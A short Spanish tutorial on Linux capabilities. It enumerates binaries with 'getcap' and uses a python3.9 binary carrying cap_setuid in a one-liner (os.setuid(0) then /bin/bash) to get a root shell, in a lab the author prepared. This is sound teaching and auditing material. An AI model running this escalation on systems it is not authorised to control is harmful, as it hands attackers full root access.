# ¿Qué son *capabilities*?

Estas nos permiten **poner en partes** los privilegios de **root** en distintos valores. Así podremos asignarlos de forma independiente a múltiples procesos y que cuenten con el permiso necesario para ejecutar un proceso sin necesidad de convertirse en **__superusuarios__**.

##### Conocer más sobre capabilities:
* [Capabilities - Linux Manual Page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
* [Linux Kernel Capabilities](https://www.incibe-cert.es/blog/linux-capabilities)

### Ejemplo de Capabilitie **__setuid__**:

**__Hemos creado previamente una Capabilitie setuid con Python3.9__**  

1. Como primer punto debemos saber las capabilities existentes para tratar de vulnerar alguna de ellas
```s
┌──(kali㉿edison)-[/]
└─$ getcap -r / 2>/dev/null 
```
**Salida:**
```bash
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/python3.9 cap_setuid=ep
/usr/bin/fping cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip
```

2. Notamos que **Python3.9** usa esta capabilitie y ahora escribimos nuestro código para ganar acceso como **__root__**:

```bash
┌──(kali㉿edison)-[/]
└─$ python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

3. Vemos como se nos despliega una consola tipo **bash** y que hemos conseguido tener acceso como root:

```bash
┌──(root💀edison)-[/]
└─# whoami
root
```
